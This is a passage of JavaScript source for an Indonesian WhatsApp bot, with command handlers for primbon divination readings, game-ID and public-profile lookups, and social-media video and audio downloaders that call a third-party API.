                ikycoli.sendText(m.chat, `│➳ *Nomor HP :* ${anu.message.nomer_hp}\n│➳ *Angka Shuzi :* ${anu.message.angka_shuzi}\n│➳ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n│➳ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Mimpi :* ${anu.message.mimpi}\n│➳ *Arti :* ${anu.message.arti}\n│➳ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Nama Anda :* ${anu.message.nama_anda.nama}\n│➳ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│➳ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Nama Anda :* ${anu.message.nama_anda.nama}\n│➳ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│➳ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Nama Suami :* ${anu.message.suami.nama}\n│➳ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n│➳ *Nama Istri :* ${anu.message.istri.nama}\n│➳ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Nama Anda :* ${anu.message.nama_anda.nama}\n│➳ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│➳ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│➳ *Sisi Positif :* ${anu.message.sisi_positif}\n│➳ *Sisi Negatif :* ${anu.message.sisi_negatif}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika Ardianta`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Arti :* ${anu.message.arti}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Life Path :* ${anu.message.life_path}\n│➳ *Destiny :* ${anu.message.destiny}\n│➳ *Destiny Desire :* ${anu.message.destiny_desire}\n│➳ *Personality :* ${anu.message.personality}\n│➳ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendImage(m.chat,  anu.message.gambar, `│➳ *Nama Anda :* ${anu.message.nama_anda}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan}\n│➳ *Sisi Positif :* ${anu.message.sisi_positif}\n│➳ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Tanggal Pernikahan :* ${anu.message.tanggal}\n│➳ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
            if (!isCreator && !isBan) return
                if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Lahir :* ${anu.message.hari_lahir}\n│➳ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Lahir :* ${anu.message.hari_lahir}\n│➳ *Rezeki :* ${anu.message.rejeki}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Lahir :* ${anu.message.hari_lahir}\n│➳ *Pekerjaan :* ${anu.message.pekerjaan}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Analisa :* ${anu.message.analisa}\n│➳ *Angka Akar :* ${anu.message.angka_akar}\n│➳ *Sifat :* ${anu.message.sifat}\n│➳ *Elemen :* ${anu.message.elemen}\n│➳ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Analisa :* ${anu.message.analisa}\n│➳ *Sektor :* ${anu.message.sektor}\n│➳ *Elemen :* ${anu.message.elemen}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendImage(m.chat, anu.message.image, `│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Simbol Tarot :* ${anu.message.simbol_tarot}\n│➳ *Arti :* ${anu.message.arti}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tahun_lahir}\n│➳ *Gender :* ${anu.message.jenis_kelamin}\n│➳ *Angka Kua :* ${anu.message.angka_kua}\n│➳ *Kelompok :* ${anu.message.kelompok}\n│➳ *Karakter :* ${anu.message.karakter}\n│➳ *Sektor Baik :* ${anu.message.sektor_baik}\n│➳ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Kala Tinantang :* ${anu.message.kala_tinantang}\n│➳ *Info :* ${anu.message.info}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Info :* ${anu.message.info}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Hari Lahir :* ${anu.message.hari_lahir}\n│➳ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n│➳ *Hari Naas :* ${anu.message.hari_naas}\n│➳ *Info :* ${anu.message.catatan}\n│➳ *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Hari Lahir :* ${anu.message.hari_lahir}\n│➳ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n│➳ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Hari Lahir :* ${anu.message.hari_lahir}\n│➳ *tanggal Lahir :* ${anu.message.tgl_lahir}\n│➳ *Arah Rezeki :* ${anu.message.arah_rejeki}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Tanggal :* ${anu.message.tanggal}\n│➳ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n│➳ *Watak Hari :* ${anu.message.watak_hari}\n│➳ *Naga Hari :* ${anu.message.naga_hari}\n│➳ *Jam Baik :* ${anu.message.jam_baik}\n│➳ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Tanggal :* ${anu.message.tgl_memancing}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix+ command} 7 7 2005`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Zodiak :* ${anu.message.zodiak}\n│➳ *Nomor :* ${anu.message.nomor_keberuntungan}\n│➳ *Aroma :* ${anu.message.aroma_keberuntungan}\n│➳ *Planet :* ${anu.message.planet_yang_mengitari}\n│➳ *Bunga :* ${anu.message.bunga_keberuntungan}\n│➳ *Warna :* ${anu.message.warna_keberuntungan}\n│➳ *Batu :* ${anu.message.batu_keberuntungan}\n│➳ *Elemen :* ${anu.message.elemen_keberuntungan}\n│➳ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'shio': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
                let anu = await primbon.shio(text)
                if (anu.status == false) return m.reply(anu.message)
                ikycoli.sendText(m.chat, `│➳ *Hasil :* ${anu.message}`, m)
            }
            break
	    case 'stalker': case 'stalk': {
	    if (!isCreator && !isBan) return
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply('Limit Harian Anda Telah Habis')
                if (!text) return m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                let [type, id, zone] = args
                if (type.toLowerCase() == 'ff') {
                    if (!id) throw `No Query id, Example ${prefix + command} ff 552992060`
                    let anu = await fetchJson(api('zenz', '/api/nickff', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ml') {
                    if (!id) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    if (!zone) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    let anu = await fetchJson(api('zenz', '/api/nickml', { apikey: global.APIKeys[global.APIs['zenz']], query: id, query2: zone }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nZone : ${anu.result.zoneId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'aov') {
                    if (!id) throw `No Query id, Example ${prefix + command} aov 293306941441181`
                    let anu = await fetchJson(api('zenz', '/api/nickaov', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'cod') {
                    if (!id) throw `No Query id, Example ${prefix + command} cod 6290150021186841472`
                    let anu = await fetchJson(api('zenz', '/api/nickcod', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'pb') {
                    if (!id) throw `No Query id, Example ${prefix + command} pb riio46`
                    let anu = await fetchJson(api('zenz', '/api/nickpb', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ig') {
                    if (!id) throw `No Query username, Example : ${prefix + command} ig cak_haho`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/ig', { username: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    ikycoli.sendMedia(m.chat, anu.caption.profile_hd, '', `│➳ Full Name : ${anu.caption.full_name}\n│➳ User Name : ${anu.caption.user_name}\n│➳ ID ${anu.caption.user_id}\n│➳ Followers : ${anu.caption.followers}\n│➳ Following : ${anu.caption.following}\n│➳ Bussines : ${anu.caption.bussines}\n│➳ Profesional : ${anu.caption.profesional}\n│➳ Verified : ${anu.caption.verified}\n│➳ Private : ${anu.caption.private}\n│➳ Bio : ${anu.caption.biography}\n│➳ Bio Url : ${anu.caption.bio_url}`, m)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'npm') {
                    if (!id) throw `No Query username, Example : ${prefix + command} npm scrape-primbon`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/npm', { query: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`│➳ Name : ${anu.name}\n│➳ Version : ${Object.keys(anu.versions)}\n│➳ Created : ${tanggal(anu.time.created)}\n│➳ Modified : ${tanggal(anu.time.modified)}\n│➳ Maintainers :\n ${anu.maintainers.map(v => `- ${v.name} : ${v.email}`).join('\n')}\n\n│➳ Description : ${anu.description}\n│➳ Homepage : ${anu.homepage}\n│➳ Keywords : ${anu.keywords}\n│➳ Author : ${anu.author.name}\n│➳ License : ${anu.license}\n│➳ Readme : ${anu.readme}`)
		    db.data.users[m.sender].limit -= 1
                } else {
                    m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                }
            }
            break
	        case 'tiktok': case 'tiktoknowm': {
	        if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/tiktok', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktokwm ${text}`, buttonText: {displayText: '► With Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.nowatermark },
                    caption: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                ikycoli.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tiktokwm': case 'tiktokwatermark': {
            if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/tiktok', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.watermark },
                    caption: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                ikycoli.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tiktokmp3': case 'tiktokaudio': {
            if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/musically', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                    {buttonId: `tiktokwm ${text}`, buttonText: {displayText: '► With Watermark'}, type: 1}
                ]
                let buttonMessage = {
                    text: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                let msg = await ikycoli.sendMessage(m.chat, buttonMessage, { quoted: m })
                ikycoli.sendMessage(m.chat, { audio: { url: anu.result.audio }, mimetype: 'audio/mpeg'}, { quoted: msg })
            }
            break
	        case 'instagram': case 'ig': case 'igdl': {
	        if (!isCreator && !isBan) return
                if (!text) throw 'No Query Url!'
                m.reply(mess.wait)
                if (/(?:\/p\/|\/reel\/|\/tv\/)([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instagram2', { url: isUrl(text)[0] }, 'apikey'))
                    for (let media of anu.data) ikycoli.sendFileUrl(m.chat, media, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                } else if (/\/stories\/([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instastory', { url: isUrl(text)[0] }, 'apikey'))
                    ikycoli.sendFileUrl(m.chat, anu.media[0].url, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                }
            }
            break
            case 'joox': case 'jooxdl': {
            if (!isCreator && !isBan) return
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/joox', { query: text }, 'apikey'))
                let msg = await ikycoli.sendImage(m.chat, anu.result.img, `│➳ Title : ${anu.result.lagu}\n│➳ Album : ${anu.result.album}\n│➳ Singer : ${anu.result.penyanyi}\n│➳ Publish : ${anu.result.publish}\n│➳ Lirik :\n${anu.result.lirik.result}`, m)
                ikycoli.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mpeg', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
            }
            break
            case 'soundcloud': case 'scdl': {
            if (!isCreator && !isBan) return
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'apikey'))
                let msg = await ikycoli.sendImage(m.chat, anu.result.thumb, `│➳ Title : ${anu.result.title}\n│➳ Url : ${isUrl(text)[0]}`)
                ikycoli.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: msg })
            }
            break
	        case 'twitdl': case 'twitter': {
	        if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twittermp3 ${text}`, buttonText: {displayText: '► Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.HD || anu.result.SD },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                ikycoli.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'twittermp3': case 'twitteraudio': {
            if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twitter ${text}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
		    image: { url: anu.result.thumb },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 4
                }
                let msg = await ikycoli.sendMessage(m.chat, buttonMessage, { quoted: m })
                ikycoli.sendMessage(m.chat, { audio: { url: anu.result.audio } }, { quoted: msg })
            }
            break
	        case 'fbdl': case 'fb': case 'facebook': {
	        if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/facebook', { url: text }, 'apikey'))
                ikycoli.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `││᭄⃟ꪶ⃟•╾ Title : ${anu.result.title}`}, { quoted: m })
            }
            break
	        case 'pindl': case 'pinterestdl': {
	        if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/pinterestdl', { url: text }, 'apikey'))
